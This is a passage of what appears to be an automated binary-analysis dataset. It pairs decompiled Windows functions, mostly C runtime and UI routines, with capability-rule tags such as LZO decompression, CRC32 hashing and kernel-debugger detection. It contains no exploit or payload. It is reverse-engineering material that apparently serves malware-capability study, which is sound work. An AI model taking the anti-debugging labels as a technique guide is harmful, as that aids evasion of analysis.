        "decompiled_code": "\nuint32_t * __cdecl fcn.0041dd16(uint32_t *arg_8h)\n\n{\n    uint32_t *arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    int64_t iVar5;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar3 = arg_8h[1];\n    if (((uVar3 < 0) || (0x1000 < uVar3)) || ((0xfff < uVar3 && (*arg_8h != 0)))) {\n        arg_8h_00 = NULL;\n    }\n    else {\n        fcn.00423871();\n        uVar3 = arg_8h[1];\n        uVar2 = *arg_8h;\n        if ((uVar3 < 0) || ((uVar3 < 1 && (uVar2 < 0x3f481)))) {\n            arg_8h_00 = fcn.00423065(arg_8h);\n            if ((*0x444924 == 0) || (iVar1 = fcn.004238bd(arg_8h_00),  iVar1 == 0)) {\n                uVar3 = *arg_8h_00;\n                var_8h = uVar3 - *0x444920;\n                var_4h = ((uVar3 >> 0x1f) - (*0x444920 >> 0x1f)) - (uVar3 < *0x444920);\n            }\n            else {\n                uVar2 = *0x444920 + *0x444928;\n                uVar3 = *arg_8h_00;\n                var_8h = uVar3 - uVar2;\n                var_4h = ((uVar3 >> 0x1f) - (uVar2 >> 0x1f)) - (uVar3 < uVar2);\n                arg_8h_00[8] = 1;\n            }\n            uVar3 = fcn.00423900(var_8h, var_4h, 0x3c, 0);\n            *arg_8h_00 = uVar3;\n            if (uVar3 < 0) {\n                *arg_8h_00 = uVar3 + 0x3c;\n                bVar4 = 0x3b < var_8h;\n                var_8h = var_8h - 0x3c;\n                var_4h = var_4h + -1 + bVar4;\n            }\n            _var_8h = fcn.0041cee0(var_8h, var_4h, 0x3c, 0);\n            _var_8h = _var_8h + arg_8h_00[1];\n            uVar3 = fcn.00423900(_var_8h, 0x3c, 0);\n            arg_8h_00[1] = uVar3;\n            if (uVar3 < 0) {\n                arg_8h_00[1] = uVar3 + 0x3c;\n                _var_8h = _var_8h + -0x3c;\n            }\n            iVar5 = fcn.0041cee0(_var_8h, 0x3c, 0);\n            _var_8h = iVar5 + arg_8h_00[2];\n            uVar3 = fcn.00423900(_var_8h, 0x18, 0);\n            arg_8h_00[2] = uVar3;\n            if (uVar3 < 0) {\n                arg_8h_00[2] = uVar3 + 0x18;\n                _var_8h = _var_8h + -0x18;\n            }\n            iVar5 = fcn.0041cee0(_var_8h, 0x18, 0);\n            iVar1 = iVar5;\n            if ((iVar5 < 0x100000000) && (iVar5 < 0)) {\n                arg_8h_00[6] = (arg_8h_00[6] + 7 + iVar1) % 7;\n                arg_8h_00[3] = arg_8h_00[3] + iVar1;\n                if (arg_8h_00[3] < 1) {\n                    arg_8h_00[5] = arg_8h_00[5] - 1;\n                    arg_8h_00[3] = arg_8h_00[3] + 0x1f;\n                    arg_8h_00[7] = 0x16c;\n                    arg_8h_00[4] = 0xb;\n                }\n                else {\n                    arg_8h_00[7] = arg_8h_00[7] + iVar1;\n                }\n            }\n        }\n        else {\n            var_8h = uVar2 - *0x444920;\n            var_4h = (uVar3 - (*0x444920 >> 0x1f)) - (uVar2 < *0x444920);\n            arg_8h_00 = fcn.00423065(&var_8h);\n            if ((*0x444924 != 0) && (iVar1 = fcn.004238bd(arg_8h_00),  iVar1 != 0)) {\n                bVar4 = var_8h < *0x444928;\n                var_8h = var_8h - *0x444928;\n                var_4h = (var_4h - (*0x444928 >> 0x1f)) - bVar4;\n                arg_8h_00 = fcn.00423065(&var_8h);\n                arg_8h_00[8] = 1;\n            }\n        }\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 1331
    },
    "00404510": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n\nuint32_t fcn.00404510(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_18h;\n    uchar auStack256 [208];\n    uint uStack48;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h_2;\n    uint var_10h;\n    code *pcStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x437d08;\n    pcStack16 = fcn.0041bbcc;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00404510::var_10h;\n    var_4h = 0;\n    uStack48 = 0x40454f;\n    fcn.0041bcd0();\n    *in_FS_OFFSET = var_10h;\n    return &stack0xffffff00 | 1;\n}\n",
        "token_count": 222
    },
    "00411aeb": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t fcn.00411aeb(uint32_t *param_1)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    \n    uVar3 = *param_1;\n    bVar4 = *(param_1 + 2) == -1;\n    if (bVar4) {\n        uVar3 = param_1[3];\n        piVar2 = param_1 + 0x1a;\n    }\n    else {\n        piVar2 = param_1 + 0x12;\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    if (*piVar2 == -1) {\n        piVar2 = piVar2 + 2;\n    }\n    else {\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    do {\n        iVar1 = *piVar2;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 != 0);\n    if ((uVar3 & 0x40) != 0) {\n        piVar2 = piVar2 + bVar4 * 2 + 1;\n        do {\n            iVar1 = *piVar2;\n            piVar2 = piVar2 + 1;\n        } while (iVar1 != 0);\n    }\n    return piVar2 + 3U & 0xfffffffc;\n}\n",
        "token_count": 383
    },
    "004174cd": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004174cd(int32_t param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    uVar2 = fcn.00414bbf(&param_2);\n    if (uVar2 == '\\0') {\n        uVar2 = uVar2 & 0xffffff00;\n    }\n    else {\n        iVar3 = unaff_retaddr * 0x30 + *(param_1 + 0x14);\n        uVar1 = *((*(iVar3 + 0x10) + 3 + *(iVar3 + 4) & 0xfffffffcU) + 4 + *(param_1 + 8));\n        *param_2 = uVar1;\n        uVar2 = CONCAT31(uVar1 >> 8, 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 210
    },
    "0042161c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h_2\n\nvoid __cdecl fcn.0042161c(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    char *pcVar4;\n    uint var_8h;\n    uint var_ch;\n    uint var_128h_2;\n    uint var_124h_2;\n    uint var_128h;\n    uint lpFilename;\n    uint var_18h_2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack4;\n    \n    uStack4 = 0x118;\n    var_18h = 0x43b5c8;\n    fcn.0041cd84();\n    *(unaff_EBP + -0x1c) = *0x444220;\n    pcVar1 = *0x44995c;\n    if (*0x44995c == NULL) {\n        if (*(unaff_EBP + 8) == 1) {\n            pcVar4 = \"Buffer overrun detected!\";\n            *(unaff_EBP + -0x128) =\n                 \"A buffer overrun has been detected which has corrupted the program\\'s\\ninternal state.  The program cannot safely continue execution and must\\nnow be terminated.\\n\"\n            ;\n        }\n        else {\n            pcVar4 = \"Unknown security failure detected!\";\n            *(unaff_EBP + -0x128) =\n                 \"A security error of unknown cause has been detected which has\\ncorrupted the program\\'s internal state.  The program cannot safely\\ncontinue execution and must now be terminated.\\n\"\n            ;\n        }\n        *(unaff_EBP + -0x20) = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, unaff_EBP + -0x124, 0x104);\n        if (iVar2 == 0) {\n            fcn.00420ad0(unaff_EBP + -0x124, \"<program name unknown>\");\n        }\n        iVar2 = unaff_EBP + -0x124;\n        iVar3 = fcn.0041c6f0(iVar2);\n        if (0x3c < iVar3 + 0xbU) {\n            iVar2 = fcn.0041c6f0(iVar2);\n            iVar2 = iVar2 + unaff_EBP + -0x155;\n            fcn.00424590(iVar2, 0x43b3e8, 3);\n        }\n        fcn.0041c6f0(iVar2);\n        fcn.0041bcd0();\n        *(unaff_EBP + -0x18) = &var_18h;\n        fcn.00420ad0(&var_18h, pcVar4);\n        fcn.00420ae0(&var_18h, 0x43b3c8);\n        fcn.00420ae0(&var_18h, \"Program: \");\n        fcn.00420ae0(&var_18h, iVar2);\n        fcn.00420ae0(&var_18h, 0x43b3c8);\n        fcn.00420ae0(&var_18h, *(unaff_EBP + -0x128));\n        fcn.0042448f(&var_18h, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        (*pcVar1)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.0041cbfc(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 919
    },
    "0041348b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041348b(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    ushort unaff_SI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.0042fb6a(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 2;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.0042f6d4();\n    }\n    **(param_1 + 0x28) = unaff_SI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 2;\n    return param_1;\n}\n",
        "token_count": 199
    },
    "004134c7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004134c7(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.0042fb6a(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 4;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.0042f6d4();\n    }\n    **(param_1 + 0x28) = unaff_ESI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 201
    },
    "00413502": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00413502(int32_t param_1)\n\n{\n    ushort *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.0042fb6a(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 2U) {\n        fcn.0042f74b((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 2);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 2;\n    return param_1;\n}\n",
        "token_count": 194
    },
    "00413545": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00413545(int32_t param_1)\n\n{\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.0042fb6a(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 4U) {\n        fcn.0042f74b((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 4);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 194
    },
    "00414ff7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414ff7(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    if ((*(in_ECX + 0x6d) & 0x10) != 0) {\n        if ((*(in_ECX + 0x68) & 1) != (arg_8h != NULL)) {\n            arg_8h = NULL;\n            *(in_ECX + 0x68) = *(in_ECX + 0x68) ^ 1;\n            iVar1 = (****(in_ECX + 0x4c))(*(in_ECX + 0x4c), 0x43c1ac, &arg_8h);\n            if (-1 < iVar1) {\n                (**(*arg_8h + 0x14))(arg_8h, 0xfffffd37);\n                (**(*arg_8h + 8))(arg_8h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 224
    },
    "0041a1a3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t fcn.0041a1a3(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (param_1 == 0) {\n        return param_1;\n    }\n    iVar1 = *(param_1 + 0x4c);\n    if (iVar1 != 0) {\n        if ((*(iVar1 + 0x6d) & 0x10) != 0) {\n            return (-((*(iVar1 + 0x68) & 1) != 0) & 0xfffffff0) + 0x20;\n        }\n        return 0;\n    }\n    uVar2 = fcn.0041a115(param_1, 0);\n    return uVar2 & 0x30;\n}\n",
        "token_count": 179
    },
    "0041e700": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041e700(uint *arg_8h, uint8_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    bool bVar4;\n    \n    if ((arg_8h & 3) != 0) {\n        if ((arg_8h & 1) != 0) {\n            uVar3 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            bVar4 = uVar3 < *arg_ch;\n            if (uVar3 != *arg_ch) goto code_r0x0041e744;\n            arg_ch = arg_ch + 1;\n            if (uVar3 == 0) {\n                return 0;\n            }\n            if ((arg_8h & 2) == 0) goto code_r0x0041e710;\n        }\n        uVar1 = *arg_8h;\n        arg_8h = arg_8h + 2;\n        uVar3 = uVar1;\n        bVar4 = uVar3 < *arg_ch;\n        if (uVar3 != *arg_ch) goto code_r0x0041e744;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar1 >> 8;\n        bVar4 = uVar3 < arg_ch[1];\n        if (uVar3 != arg_ch[1]) goto code_r0x0041e744;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        arg_ch = arg_ch + 2;\n    }\ncode_r0x0041e710:\n    while( true ) {\n        uVar2 = *arg_8h;\n        uVar3 = uVar2;\n        bVar4 = uVar3 < *arg_ch;\n        if (uVar3 != *arg_ch) break;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar2 >> 8;\n        bVar4 = uVar3 < arg_ch[1];\n        if (uVar3 != arg_ch[1]) break;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar2 >> 0x10;\n        bVar4 = uVar3 < arg_ch[2];\n        if (uVar3 != arg_ch[2]) break;\n        if (uVar3 == 0) {\n            return 0;\n        }\n        uVar3 = uVar2 >> 0x18;\n        bVar4 = uVar3 < arg_ch[3];\n        if (uVar3 != arg_ch[3]) break;\n        arg_ch = arg_ch + 4;\n        arg_8h = arg_8h + 1;\n        if (uVar3 == 0) {\n            return 0;\n        }\n    }\ncode_r0x0041e744:\n    return bVar4 * -2 + 1;\n}\n",
        "token_count": 672
    },
    "004200c1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004200c1(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t arg_8h_00;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    piVar2 = arg_ch;\n    uVar1 = arg_ch[3];\n    arg_8h_00 = arg_ch[4];\n    if (((uVar1 & 0x82) == 0) || ((uVar1 & 0x40) != 0)) {\ncode_r0x004201cd:\n        arg_ch[3] = uVar1 | 0x20;\n    }\n    else {\n        if ((uVar1 & 1) != 0) {\n            arg_ch[1] = 0;\n            if ((uVar1 & 0x10) == 0) goto code_r0x004201cd;\n            *arg_ch = arg_ch[2];\n            arg_ch[3] = uVar1 & 0xfffffffe;\n        }\n        uVar1 = arg_ch[3];\n        arg_ch[1] = 0;\n        arg_ch = NULL;\n        piVar2[3] = uVar1 & 0xffffffef | 2;\n        if (((uVar1 & 0x10c) == 0) &&\n           (((piVar2 != 0x444a60 && (piVar2 != 0x444a80)) || (iVar3 = fcn.0042427d(arg_8h_00),  iVar3 == 0)))) {\n            fcn.00424239(piVar2);\n        }\n        if ((*(piVar2 + 3) & 0x108) == 0) {\n            iVar3 = 1;\n            arg_ch = fcn.0042418e(arg_8h_00, &arg_8h, 1);\n        }\n        else {\n            iVar4 = piVar2[2];\n            iVar3 = *piVar2;\n            *piVar2 = iVar4 + 1;\n            iVar3 = iVar3 - iVar4;\n            piVar2[1] = piVar2[6] + -1;\n            if (iVar3 < 1) {\n                if (arg_8h_00 == 0xffffffff) {\n                    iVar4 = 0x444720;\n                }\n                else {\n                    iVar4 = *((arg_8h_00 >> 5) * 4 + 0x44aba0) + (arg_8h_00 & 0x1f) * 0x24;\n                }\n                if ((*(iVar4 + 4) & 0x20) != 0) {\n                    fcn.00423f15(arg_8h_00, 0, 2);\n                }\n            }\n            else {\n                arg_ch = fcn.0042418e(arg_8h_00, iVar4, iVar3);\n            }\n            *piVar2[2] = arg_8h;\n        }\n        if (arg_ch == iVar3) {\n            return arg_8h & 0xff;\n        }\n        piVar2[3] = piVar2[3] | 0x20;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 723
    },
    "00423f15": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00423f15(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43bd90, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x44ab84) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x44aba0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.0042558c(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0041da34();\n                *puVar3 = 9;\n                puVar3 = fcn.0041da3d();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00423ea1(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00423f9c();\n            goto code_r0x00423fba;\n        }\n    }\n    puVar3 = fcn.0041da34();\n    *puVar3 = 9;\n    puVar3 = fcn.0041da3d();\n    *puVar3 = 0;\ncode_r0x00423fba:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 523
    },
    "0042418e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042418e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43bda0, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x44ab84) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x44aba0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.0042558c(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0041da34();\n                *puVar3 = 9;\n                puVar3 = fcn.0041da3d();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00423fc0(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00424215();\n            goto code_r0x00424233;\n        }\n    }\n    puVar3 = fcn.0041da34();\n    *puVar3 = 9;\n    puVar3 = fcn.0041da3d();\n    *puVar3 = 0;\ncode_r0x00424233:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 520
    },
    "00424e74": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00424e74(void)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    uint16_t unaff_BX;\n    \n    uVar1 = 0;\n    if ((unaff_BX & 1) != 0) {\n        uVar1 = 0x10;\n    }\n    if ((unaff_BX & 4) != 0) {\n        uVar1 = uVar1 | 8;\n    }\n    if ((unaff_BX & 8) != 0) {\n        uVar1 = uVar1 | 4;\n    }\n    if ((unaff_BX & 0x10) != 0) {\n        uVar1 = uVar1 | 2;\n    }\n    if ((unaff_BX & 0x20) != 0) {\n        uVar1 = uVar1 | 1;\n    }\n    if ((unaff_BX & 2) != 0) {\n        uVar1 = uVar1 | 0x80000;\n    }\n    uVar2 = unaff_BX & 0xc00;\n    if ((unaff_BX & 0xc00) != 0) {\n        if (uVar2 == 0x400) {\n            uVar1 = uVar1 | 0x100;\n        }\n        else if (uVar2 == 0x800) {\n            uVar1 = uVar1 | 0x200;\n        }\n        else if (uVar2 == 0xc00) {\n            uVar1 = uVar1 | 0x300;\n        }\n    }\n    if ((unaff_BX & 0x300) == 0) {\n        uVar1 = uVar1 | 0x20000;\n    }\n    else if ((unaff_BX & 0x300) == 0x200) {\n        uVar1 = uVar1 | 0x10000;\n    }\n    if ((unaff_BX & 0x1000) != 0) {\n        uVar1 = uVar1 | 0x40000;\n    }\n    return uVar1;\n}\n",
        "token_count": 473
    },
    "0042554b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.0042554b(uint32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((param_1 < *0x44ab84) &&\n       (puVar1 = *((param_1 >> 5) * 4 + 0x44aba0) + (param_1 & 0x1f) * 0x24,  (*(puVar1 + 1) & 1) != 0)) {\n        return *puVar1;\n    }\n    puVar1 = fcn.0041da34();\n    *puVar1 = 9;\n    puVar1 = fcn.0041da3d();\n    *puVar1 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 162
    },
    "00425ab0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00425ab0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43bf88, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x44ab84) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x44aba0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.0042558c(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0041da34();\n                *puVar3 = 9;\n                puVar3 = fcn.0041da3d();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.004258d5(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00425b37();\n            goto code_r0x00425b55;\n        }\n    }\n    puVar3 = fcn.0041da34();\n    *puVar3 = 9;\n    puVar3 = fcn.0041da3d();\n    *puVar3 = 0;\ncode_r0x00425b55:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 522
    },
    "00426fc3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00426fc3(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43bff0, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x44ab84) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x44aba0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.0042558c(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0041da34();\n                *puVar3 = 9;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00426f40(arg_8h_00);\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0042703a();\n            goto code_r0x00427058;\n        }\n    }\n    puVar3 = fcn.0041da34();\n    *puVar3 = 9;\n    puVar3 = fcn.0041da3d();\n    *puVar3 = 0;\ncode_r0x00427058:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 466
    },
    "0042a955": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0042a955(int32_t *param_1, uint8_t param_2)\n\n{\n    bool bVar1;\n    bool bVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t unaff_EBX;\n    uint8_t unaff_retaddr;\n    \n    bVar1 = true;\n    bVar2 = false;\n    if (((param_2 & 4) == 0) || (uVar4 = fcn.0042ce20(),  (uVar4 & 0x10000000) != 0)) {\n        bVar1 = false;\n    }\n    iVar5 = (*_sym.imp.USER32.dll_GetParent)(param_1[7]);\n    param_1[0xe] = param_1[0xe] | 0x18;\n    iVar6 = fcn.00428538();\n    pcVar3 = _sym.imp.USER32.dll_UpdateWindow;\ncode_r0x0042aa14:\n    while ((!bVar2 || (iVar7 = (*_sym.imp.USER32.dll_PeekMessageA)(iVar6, 0, 0, 0, 0),  iVar7 != 0))) {\n        do {\n            iVar7 = fcn.0042883c();\n            if (iVar7 == 0) {\n                fcn.00434b05(0);\n                return -1;\n            }\n            if ((bVar1) && ((*(iVar6 + 4) == 0x118 || (*(iVar6 + 4) == 0x104)))) {\n                fcn.0042cf22(1);\n                (*pcVar3)(param_1[7]);\n                bVar1 = false;\n            }\n            iVar7 = (**(*param_1 + 0x80))();\n            if (iVar7 == 0) {\n                param_1[0xe] = param_1[0xe] & 0xffffffe7;\n                return param_1[0x10];\n            }\n            iVar7 = fcn.004287a8(iVar6);\n            if (iVar7 != 0) {\n                bVar2 = true;\n                unaff_EBX = 0;\n            }\n            iVar7 = (*_sym.imp.USER32.dll_PeekMessageA)(iVar6, 0, 0, 0, 0);\n        } while (iVar7 != 0);\n    }\n    if (bVar1) {\n        fcn.0042cf22(1);\n        (*pcVar3)(param_1[7]);\n        bVar1 = false;\n    }\n    if ((((unaff_retaddr & 1) == 0) && (iVar5 != 0)) && (unaff_EBX == 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x121, 0, param_1[7]);\n    }\n    if ((unaff_retaddr & 2) == 0) goto code_r0x0042a9f5;\n    goto code_r0x0042aa10;\ncode_r0x0042a9f5:\n    iVar7 = (*_sym.imp.USER32.dll_SendMessageA)(param_1[7], 0x36a, 0, unaff_EBX);\n    unaff_EBX = unaff_EBX + 1;\n    if (iVar7 == 0) {\ncode_r0x0042aa10:\n        bVar2 